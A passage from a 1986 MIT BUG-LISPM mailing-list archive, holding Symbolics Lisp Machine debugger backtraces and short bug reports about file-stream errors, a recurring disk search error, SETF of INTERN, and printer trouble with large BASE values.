   Arg 4 (FS:STREAM-OR-HANDLE): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 5 (FS:SIMPLE-P): NIL
   Arg 6 (FS:WHOSTATE): "Finish"
   Rest arg (FS:COMMANDS): ("FINISH")
   Local 8 (FS:HANDLE): "O4759"
   Local 9 (FS:STREAM): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Local 10 (FS:PKT): #<Chaos Packet 105401503>
   Local 11 (FS:SUCCESS): NIL
   Local 12 (STRING): "O4759 ERROR UKC F Unknown command"
   Local 13 (FS:TRANSACTION-ID): "T4767"
   Local 14 (FS:CREATE-P): NIL
   Local 15 (CONDITION): NIL
   Local 16: T
   Local 17: #<CASE-HANDLER 144656741>
   Local 18: NIL
   Local 19: (#<CASE-HANDLER 144656741>)

(:METHOD FS:FILE-DATA-STREAM-MIXIN :COMMAND):  (P.C. = 14)
   Arg 0 (SELF): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 1 (SELF-MAPPING-TABLE): #<Map to flavor FS:FILE-DATA-STREAM-MIXIN -- 6. IV's, 0. FL's 121343220>
   Arg 2 (SI:OPERATION): :COMMAND
   Arg 3 (FS:MARK-P): :OUTPUT
   Arg 4 (FS:WHOSTATE): "Finish"
   Arg 5 (FS:COM): "FINISH"
   Rest arg (FS:STRINGS): NIL

(:METHOD FS:FILE-OUTPUT-STREAM-MIXIN :FINISH):  (P.C. = 25)
   Arg 0 (SELF): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 1 (SELF-MAPPING-TABLE): #<Map to flavor FS:FILE-OUTPUT-STREAM-MIXIN -- 6. IV's, 1. FL's 121343202>
   Arg 2 (SI:OPERATION): :FINISH

(:METHOD FS:FILE-OUTPUT-CHARACTER-STREAM :COMBINED :FINISH):  (P.C. = 20)
   Arg 0 (SELF): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 1 (SELF-MAPPING-TABLE): #<Map to flavor FS:FILE-OUTPUT-CHARACTER-STREAM -- 1. IV's, 8. FL's 121343271>
   Arg 2 (SI:.OPERATION.): :FINISH
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

SEND:  (P.C. = 6)
   Arg 0 (SI:OBJECT): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 1 (SI:MESSAGE-NAME): :FINISH
   Rest arg (SI:ARGUMENTS): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SEND FILE :FINISH)
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:BREAK-INTERNAL 1.):  (P.C. = 4)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): (NIL)
   Arg 1 (SI:FORM): (SEND FILE :FINISH)

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0.):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 43440264>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0.) 43440271>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Breakpoint ZMACS"
   Arg 1 (SI:ABORT-FUNCTION): SI:BREAK-HERALD
   Arg 2 (SI:READ-FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL SI:BREAK-INTERNAL 0.) 34630253>
   Arg 3 (SI:EVAL-FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL SI:BREAK-INTERNAL 1.) 34630255>
   --Defaulted args:--
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:BREAK-INTERNAL:  (P.C. = 212)
   Arg 0 (SI:TAG): "ZMACS"
   Local 0 (SI:TAG): "Breakpoint ZMACS"
   Arg 1 (SI:CONDITIONAL): T
   --Defaulted args:--
   Arg 2: NIL

ZWEI:COM-BREAK:  (P.C. = 65)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-BREAK
   Arg 1 (ZWEI:CHAR): 129.
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
   Arg 0 (ZWEI:CH): 129.

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120377766>
   Arg 2 (SI:OPERATION): :EDIT
   --Defaulted args:--
   Arg 3 (ZWEI:TOP-LEVEL-P): T
   Arg 4 (ZWEI:DESCRIPTION): NIL

(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TOP-LEVEL-EDITOR -- 13. IV's, 1. FL's 120377366>
   Arg 2 (SI:.OPERATION.): :EDIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
 1-Jun-86 03:21:44-EDT,3196;000000000000
Received: from MACH.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 Jun 86 03:21-EDT
Date: Sun, 1 Jun 86 03:21 EDT
From: David Vinayak Wallace <Gumby@AI.AI.MIT.EDU>
Subject: ditto for :set-pointer message
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860601032154.5.GUMBY@MACH.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 16.0, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0, Japanese 24.2,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(5),
FEP0:>v127-loaders.flod(5), FEP0:>v127-info.flod(5),
FEP0:>v127-debug.flod(10), on Lisp Machine Ernst Mach:

>>Error: Illegal file handle for FILEPOS
While in the function (:METHOD FS:HOST-UNIT :COMMAND)  (:METHOD FS:FILE-DATA-STREAM-MIXIN :COMMAND)  (:METHOD FS:FILE-DATA-STREAM-MIXIN :SET-BUFFER-POINTER)

(:METHOD FS:HOST-UNIT :COMMAND):  (P.C. = 236)
   Arg 0 (SELF): #<HOST-UNIT 27416174>
   Arg 1 (SELF-MAPPING-TABLE): FS:HOST-UNIT
   Arg 2 (SI:OPERATION): :COMMAND
   Arg 3 (FS:MARK-P): T
   Local 3 (FS:MARK-P): :OUTPUT
   Arg 4 (FS:STREAM-OR-HANDLE): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 5 (FS:SIMPLE-P): NIL
   Arg 6 (FS:WHOSTATE): "File Position"
   Rest arg (FS:COMMANDS): ("FILEPOS " "3")
   Local 8 (FS:HANDLE): "O4759"
   Local 9 (FS:STREAM): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Local 10 (FS:PKT): #<Chaos Packet 105401503>
   Local 11 (FS:SUCCESS): NIL
   Local 12 (STRING): "O4759 ERROR BUG F Illegal file handle for FILEPOS"
   Local 13 (FS:TRANSACTION-ID): "T4772"
   Local 14 (FS:CREATE-P): NIL
   Local 15 (CONDITION): NIL
   Local 16: T
   Local 17: #<CASE-HANDLER 144656741>
   Local 18: NIL
   Local 19: (#<CASE-HANDLER 144656741>)

(:METHOD FS:FILE-DATA-STREAM-MIXIN :COMMAND):  (P.C. = 14)
   Arg 0 (SELF): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 1 (SELF-MAPPING-TABLE): #<Map to flavor FS:FILE-DATA-STREAM-MIXIN -- 6. IV's, 0. FL's 121343220>
   Arg 2 (SI:OPERATION): :COMMAND
   Arg 3 (FS:MARK-P): T
   Arg 4 (FS:WHOSTATE): "File Position"
   Arg 5 (FS:COM): "FILEPOS "
   Rest arg (FS:STRINGS): ("3")

(:METHOD FS:FILE-DATA-STREAM-MIXIN :SET-BUFFER-POINTER):  (P.C. = 45)
   Arg 0 (SELF): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 1 (SELF-MAPPING-TABLE): #<Map to flavor FS:FILE-DATA-STREAM-MIXIN -- 6. IV's, 0. FL's 121343220>
   Arg 2 (SI:OPERATION): :SET-BUFFER-POINTER
   Arg 3 (FS:NEW-POINTER): 3.

(:METHOD SI:OUTPUT-POINTER-REMEMBERING-MIXIN :SET-POINTER):  (P.C. = 53)
   Arg 0 (SELF): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 1 (SELF-MAPPING-TABLE): #<Map to flavor SI:OUTPUT-POINTER-REMEMBERING-MIXIN -- 5. IV's, 0. FL's 121343235>
   Arg 2 (SI:OPERATION): :SET-POINTER
   Arg 3 (SI:NEW-POINTER): 3.

SEND:  (P.C. = 6)
   Arg 0 (SI:OBJECT): #<FILE-OUTPUT-CHARACTER-STREAM "MX: GUMBY; TEMP FILE" 30075454>
   Arg 1 (SI:MESSAGE-NAME): :SET-POINTER
   Rest arg (SI:ARGUMENTS): (3.)

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SEND FILE :SET-POINTER 3.)
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL
 1-Jun-86 18:47:49-EDT,956;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 Jun 86 18:47-EDT
Received: from WRONSKI.AI.MIT.EDU by REAGAN.AI.MIT.EDU via CHAOS with CHAOS-MAIL id 34357; Sun 1-Jun-86 18:48:35-EDT
Date: Sun, 1 Jun 86 18:47 EDT
From: Brian C. Williams <WILLIAMS@OZ.AI.MIT.EDU>
Subject: Irrecoverable disk search error on Wronski
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <"860601184752.1.williams@OZ"@WRONSKI.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 16.0, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0, Japanese 24.2,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(5),
FEP0:>v127-loaders.flod(5), FEP0:>v127-debug.flod(10),
FEP0:>v127-info.flod(5), on Lisp Machine J. M. Hoene Wronski:

I get an Irrecoverable disk search error on Wronski about every 30 minutes.

I have written down the results of "Show Status" for two crashes and they are
sitting on top of the monitor in room 745.
 2-Jun-86 00:34:24-EDT,363;000000000000
Received: from MX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 2 Jun 86 00:34-EDT
Date: Mon,  2 Jun 86 00:34:32 EDT
From: David Vinayak Wallace <GUMBY%MX.LCS.MIT.EDU@MC.LCS.MIT.EDU>
Subject:  (SETF (INTERN ...))
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <[MX.LCS.MIT.EDU].923650.860602.GUMBY>

Rel 6, etc

SETF should understand INTERN, expanding into SET.
 2-Jun-86 01:35:58-EDT,1016;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 2 Jun 86 01:35-EDT
Received: from MOSCOW-CENTRE.AI.MIT.EDU by REAGAN.AI.MIT.EDU via CHAOS with CHAOS-MAIL id 34382; Mon 2-Jun-86 01:36:53-EDT
Date: Mon, 2 Jun 86 01:36 EDT
From: David Vinayak Wallace <Gumby@AI.AI.MIT.EDU>
Subject: screwing around with base
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860602013606.2.GUMBY@MOSCOW-CENTRE.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 16.0, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0, Japanese 24.2,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(5),
FEP0:>V127-LOADERS.FLOD(5), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Moscow Centre:

setting BASE to be something suitably large can be amusing when your
font-map is well set up, but ultimately causes you problems.  Perhaps
the printer, in the same way that it checks for BASE of 0 or 1, should
check for something bigger than (- GREATEST-CHARACTER-CODE #/1 1)?
